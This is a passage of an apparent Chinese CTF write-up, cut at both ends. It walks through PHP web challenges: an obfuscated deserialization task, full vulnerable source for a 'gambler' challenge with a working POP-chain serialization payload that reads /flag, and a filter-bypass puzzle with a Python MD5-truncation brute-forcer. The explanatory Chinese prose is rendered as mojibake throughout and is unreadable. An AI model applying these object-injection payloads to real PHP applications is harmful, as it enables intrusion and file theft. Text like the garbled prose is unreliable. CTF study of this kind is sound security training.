class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$class</span> = unserialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$class</span>-&gt;NGPaqV(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure><p>æ˜æ˜¾æ˜¯è€ƒå¯Ÿååºåˆ—åŒ–ï¼Œä½†æ‰“å¼€<code>class.php.txt</code>åå°±å‚»äº†ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210617180619219.png" alt="image-20210617180619219"></p><p>å¥½å®¶ä¼™ï¼Œè¿‘17ä¸‡è¡Œä»£ç ï¼Œè¿™å¾—æœ‰å¤šå°‘ä¸ªç±»ã€‚è™½ç„¶çŸ¥é“è‚¯å®šå¾ˆå¤šç±»æ˜¯æ¥æ··æ·†çš„ï¼Œä½†ä»ä¸­æ‰¾å‡ºå¯åˆ©ç”¨çš„ç±»è¿›è¡Œæ„é€ ï¼Œå…¶å·¥ä½œé‡ä¹‹å¤§ï¼å†™è„šæœ¬æ‰¾å¯è¡Œï¼Œä½†ä¸ä¼šå•Šï¼ˆæµä¸‹äº†æ²¡æœ‰æŠ€æœ¯çš„æ³ªæ°´ï¼‰ã€‚</p><p>èµ›åçœ‹å¸ˆå‚…çš„wpï¼Œè¿‡æ»¤çš„æ€è·¯æ˜¯è¿™æ ·çš„ï¼š</p><ol><li>eval æ²¡è¢«å¼•ç”¨ï¼Œè¿‡æ»¤</li><li>for å¾ªç¯ä¸­ä¼šè¦†ç›–ä¼ å…¥å‚æ•°å€¼ï¼Œè¿‡æ»¤</li><li>eval å‰ä¼šè¦†ç›–å€¼å‚æ•°å€¼ï¼Œè¿‡æ»¤</li><li>é™¤äº†å…¥å£å‡½æ•°å¤–ï¼Œå…¶ä»–å‡½æ•°åªè¢«å¼•ç”¨ä¸€æ¬¡çš„ï¼Œè¿‡æ»¤</li></ol><p>ä¾æ­¤ç¼–å†™è„šæœ¬ï¼ˆçœ‹ä¸å¤ªæ‡‚QAQï¼‰ï¼Œè¿‡æ»¤å®Œåæ‰¾åˆ°å…³é”®çš„evalï¼Œæ„é€ POPé“¾ï¼Œè·å–flagã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image.png"></p><h1 id="0x02-å¼ºç½‘å…ˆé”‹-èµŒå¾’"><a href="#0x02-å¼ºç½‘å…ˆé”‹-èµŒå¾’" class="headerlink" title="0x02 [å¼ºç½‘å…ˆé”‹]èµŒå¾’"></a>0x02 [å¼ºç½‘å…ˆé”‹]èµŒå¾’</h1><p>ç›®å½•çˆ†ç ´åå¾—åˆ°<code>www.zip</code>ï¼Œä¸‹è½½åæ˜¯<code>index.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//hint is in hint.php</span></span><br><span class="line">error_reporting(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>=<span class="string">&#x27;syst3m(&quot;cat 127.0.0.1/etc/hint&quot;);&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;I think you need /etc/hint . Before this you need to see the source code&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_sayhello</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;ok&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hi&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_sayhello();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$cc</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;give you flag : &quot;</span>.<span class="keyword">$this</span>-&gt;flag;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$phonenumber</span>=<span class="number">123123</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$promise</span>=<span class="string">&#x27;I do&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;promise=<span class="string">&#x27;I will not !!!!&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;promise;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;file[<span class="string">&#x27;filename&#x27;</span>]-&gt;ffiillee[<span class="string">&#x27;ffiilleennaammee&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Room</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sth_to_set</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Get_hint</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$hint</span>=base64_encode(file_get_contents(<span class="variable">$file</span>));</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$hint</span>;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="keyword">$this</span>-&gt;Get_hint(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>]))&#123;</span><br><span class="line">    unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$hi</span> = <span class="keyword">new</span>  Start();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å‡ºç°çš„é­”æœ¯æ–¹æ³•ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__construct   å½“ä¸€ä¸ªå¯¹è±¡åˆ›å»ºæ—¶è¢«è°ƒç”¨ï¼Œ</span><br><span class="line">__toString   å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²è¢«è°ƒç”¨ã€‚</span><br><span class="line">__wakeup()   ä½¿ç”¨unserializeæ—¶è§¦å‘</span><br><span class="line">__get()    ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®</span><br><span class="line">#ä¸å¯è®¿é—®åŒ…æ‹¬ï¼šï¼ˆ1ï¼‰ç§æœ‰å±æ€§ï¼Œï¼ˆ2ï¼‰æ²¡æœ‰åˆå§‹åŒ–çš„å±æ€§</span><br><span class="line">__invoke()   å½“è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘</span><br></pre></td></tr></table></figure><p>æ„é€ POPé“¾</p><ol><li>å½“ç”¨getæ–¹æ³•ä¼ å…¥ä¸€ä¸ªhelloå‚æ•°åï¼Œå› æœ‰ååºåˆ—åŒ–çš„æ“ä½œï¼Œä¼šè‡ªåŠ¨è°ƒç”¨Startç±»ä¸­çš„__wakeupæ–¹æ³•</li><li>__wakeupæ–¹æ³•ä¼šæ‰§è¡Œsayhello()è¿™ä¸ªæ–¹æ³•ï¼Œå¦‚æœnameå±æ€§æ˜¯Infoç±»çš„ä¸€ä¸ªå¯¹è±¡ï¼Œé‚£ä¹ˆå› ä¸ºè¿™ä¸ªå¯¹è±¡è¢«å½“æˆå­—ç¬¦ä¸²æ‰“å°äº†ï¼Œæ‰€ä»¥ä¼šè‡ªåŠ¨è°ƒç”¨Infoç±»çš„toStringæ–¹æ³•</li><li>__toStringæ–¹æ³•è¿”å›file[â€˜filenameâ€™]çš„ffiillee[â€˜ffiilleennaammeeâ€™]å±æ€§ï¼Œå¦‚æœfile[â€˜filenameâ€™]æ˜¯Roomçš„ä¸€ä¸ªå¯¹è±¡ï¼Œå› ä¸ºRoomç±»é‡Œæ²¡æœ‰ffiillee[â€˜ffiilleennaammeeâ€™]è¿™ä¸ªå±æ€§ï¼Œè¿™å°±ç›¸å½“äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®ï¼Œæ‰€ä»¥ä¼šè‡ªåŠ¨è°ƒç”¨Roomç±»çš„getæ–¹æ³•</li><li>__getæ–¹æ³•æŠŠaå±æ€§èµ‹å€¼ç»™functionï¼Œç„¶åæ‰§è¡Œfunctionæ–¹æ³•ï¼Œå¦‚æœaå±æ€§æ˜¯Roomçš„ä¸€ä¸ªå¯¹è±¡ï¼Œè¿™å°±ç›¸å½“äºå°†å¯¹è±¡ä½œä¸ºå‡½æ•°è°ƒç”¨ï¼Œæ‰€ä»¥ä¼šè‡ªåŠ¨è§¦å‘Roomç±»çš„invokeæ–¹æ³•</li><li>__invokeæ–¹æ³•æ‰§è¡ŒGet_hintå‡½æ•°ï¼ŒGet_hint()å°†flagä»¥base64ç¼–ç å¹¶æ‰“å°å‡ºæ¥</li></ol><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$phonenumber</span> = <span class="number">123123</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$promise</span> = <span class="string">&#x27;Ido&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Room</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sth_to_set</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> Start();</span><br><span class="line"><span class="variable">$a</span>-&gt;name=<span class="keyword">new</span> Info();</span><br><span class="line"><span class="variable">$a</span>-&gt;name-&gt;file[<span class="string">&#x27;filename&#x27;</span>]=<span class="keyword">new</span> Room();</span><br><span class="line"><span class="variable">$a</span>-&gt;name-&gt;file[<span class="string">&#x27;filename&#x27;</span>]-&gt;a=<span class="keyword">new</span> Room();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>base64è§£ç å¾—åˆ°flag</p><h1 id="0x03-å¼ºç½‘å…ˆé”‹-å¯»å®"><a href="#0x03-å¼ºç½‘å…ˆé”‹-å¯»å®" class="headerlink" title="0x03 [å¼ºç½‘å…ˆé”‹]å¯»å®"></a>0x03 [å¼ºç½‘å…ˆé”‹]å¯»å®</h1><p><strong>key1</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$filter_word</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;index&#x27;</span>,<span class="string">&#x27;KeY1lhv&#x27;</span>,<span class="string">&#x27;source&#x27;</span>,<span class="string">&#x27;key&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;echo&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\(&#x27;</span>,<span class="string">&#x27;\.&#x27;</span>,<span class="string">&#x27;num&#x27;</span>,<span class="string">&#x27;html&#x27;</span>,<span class="string">&#x27;\/&#x27;</span>,<span class="string">&#x27;\,&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;0000000&#x27;</span>);</span><br><span class="line">        <span class="variable">$filter_phrase</span>= <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_word</span>).<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> preg_replace(<span class="variable">$filter_phrase</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ppp</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$ppp</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ppp</span>[<span class="string">&#x27;number1&#x27;</span>] = <span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="variable">$ppp</span>[<span class="string">&#x27;number2&#x27;</span>] = <span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="variable">$ppp</span>[<span class="string">&#x27;nunber3&#x27;</span>] = <span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="variable">$ppp</span>[<span class="string">&#x27;number4&#x27;</span>] = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"><span class="variable">$ppp</span>[<span class="string">&#x27;number5&#x27;</span>] = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">extract(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$num1</span> = filter(<span class="variable">$ppp</span>[<span class="string">&#x27;number1&#x27;</span>]);        </span><br><span class="line"><span class="variable">$num2</span> = filter(<span class="variable">$ppp</span>[<span class="string">&#x27;number2&#x27;</span>]);        </span><br><span class="line"><span class="variable">$num3</span> = filter(<span class="variable">$ppp</span>[<span class="string">&#x27;number3&#x27;</span>]);        </span><br><span class="line"><span class="variable">$num4</span> = filter(<span class="variable">$ppp</span>[<span class="string">&#x27;number4&#x27;</span>]);</span><br><span class="line"><span class="variable">$num5</span> = filter(<span class="variable">$ppp</span>[<span class="string">&#x27;number5&#x27;</span>]);    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$num1</span>) &amp;&amp; is_numeric(<span class="variable">$num1</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;éæ•°å­—&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num1</span> &gt; <span class="number">1024</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ç¬¬ä¸€å±‚&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$num2</span>) &amp;&amp; strlen(<span class="variable">$num2</span>) &lt;= <span class="number">4</span> &amp;&amp; intval(<span class="variable">$num2</span> + <span class="number">1</span>) &gt; <span class="number">500000</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;ç¬¬äºŒå±‚&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$num3</span>) &amp;&amp; <span class="string">&#x27;4bf21cd&#x27;</span> === substr(md5(<span class="variable">$num3</span>),<span class="number">0</span>,<span class="number">7</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;ç¬¬ä¸‰å±‚&quot;</span>;</span><br><span class="line">                <span class="keyword">if</span>(!(<span class="variable">$num4</span> &lt; <span class="number">0</span>)&amp;&amp;(<span class="variable">$num4</span> == <span class="number">0</span>)&amp;&amp;(<span class="variable">$num4</span> &lt;= <span class="number">0</span>)&amp;&amp;(strlen(<span class="variable">$num4</span>) &gt; <span class="number">6</span>)&amp;&amp;(strlen(<span class="variable">$num4</span>) &lt; <span class="number">8</span>)&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$num4</span>) )&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;ç¬¬å››å±‚&quot;</span>;</span><br><span class="line">                    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$num5</span>)||(strlen(<span class="variable">$num5</span>)==<span class="number">0</span>)) <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">                    <span class="variable">$b</span>=json_decode(@<span class="variable">$num5</span>);</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$y</span> = <span class="variable">$b</span> === <span class="literal">NULL</span>)&#123;</span><br><span class="line">                                <span class="keyword">if</span>(<span class="variable">$y</span> === <span class="literal">true</span>)&#123;</span><br><span class="line">                                    <span class="keyword">echo</span> <span class="string">&quot;ç¬¬äº”å±‚&quot;</span>;</span><br><span class="line">                                    <span class="keyword">include</span> <span class="string">&#x27;KeY1lhv.php&#x27;</span>;</span><br><span class="line">                                    <span class="keyword">echo</span> <span class="variable">$KEY1</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">                            <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no111&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><p>éæ•°å­—ä¸”å¤§äº1024ï¼Œ1025aå¯ç»•è¿‡</p></li><li><p>ç§‘å­¦è®¡æ•°æ³•ç»•è¿‡</p></li><li><p>md5æˆªæ–­</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"></span><br><span class="line"><span class="comment"># MD5æˆªæ–­æ•°å€¼å·²çŸ¥ æ±‚åŸå§‹æ•°æ®</span></span><br><span class="line"><span class="comment"># ä¾‹å­ substr(md5(captcha), 0, 6)=60b7ef</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">s</span>):</span>  <span class="comment"># è®¡ç®—MD5å­—ç¬¦ä¸²</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(<span class="built_in">str</span>(s).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">keymd5 = <span class="string">&#x27;4bf21cd&#x27;</span>   <span class="comment">#å·²çŸ¥çš„md5æˆªæ–­å€¼</span></span><br><span class="line">md5start = <span class="number">0</span>   <span class="comment"># è®¾ç½®é¢˜ç›®å·²çŸ¥çš„æˆªæ–­ä½ç½®</span></span><br><span class="line">md5length = <span class="number">7</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findmd5</span>(<span class="params">sss</span>):</span>    <span class="comment"># è¾“å…¥èŒƒå›´ é‡Œé¢ä¼šè¿›è¡Œmd5æµ‹è¯•</span></span><br><span class="line">    key = sss.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    start = <span class="built_in">int</span>(key[<span class="number">0</span>])   <span class="comment"># å¼€å§‹ä½ç½®</span></span><br><span class="line">    end = <span class="built_in">int</span>(key[<span class="number">1</span>])    <span class="comment"># ç»“æŸä½ç½®</span></span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start, end):</span><br><span class="line">        <span class="comment"># print(md5(i)[md5start:md5length])</span></span><br><span class="line">        <span class="keyword">if</span> md5(i)[<span class="number">0</span>:<span class="number">7</span>] == keymd5:            <span class="comment"># æ‹¿åˆ°åŠ å¯†å­—ç¬¦ä¸²</span></span><br><span class="line">            result = i</span><br><span class="line">            print(result)    <span class="comment"># æ‰“å°</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span>=[]  <span class="comment"># å‚æ•°åˆ—è¡¨</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):   <span class="comment"># å¤šçº¿ç¨‹çš„æ•°å­—åˆ—è¡¨ å¼€å§‹ä¸ç»“å°¾</span></span><br><span class="line">    <span class="built_in">list</span>.append(<span class="built_in">str</span>(<span class="number">10000000</span>*i) + <span class="string">&#x27;:&#x27;</span> + <span class="built_in">str</span>(<span class="number">10000000</span>*(i+<span class="number">1</span>)))</span><br><span 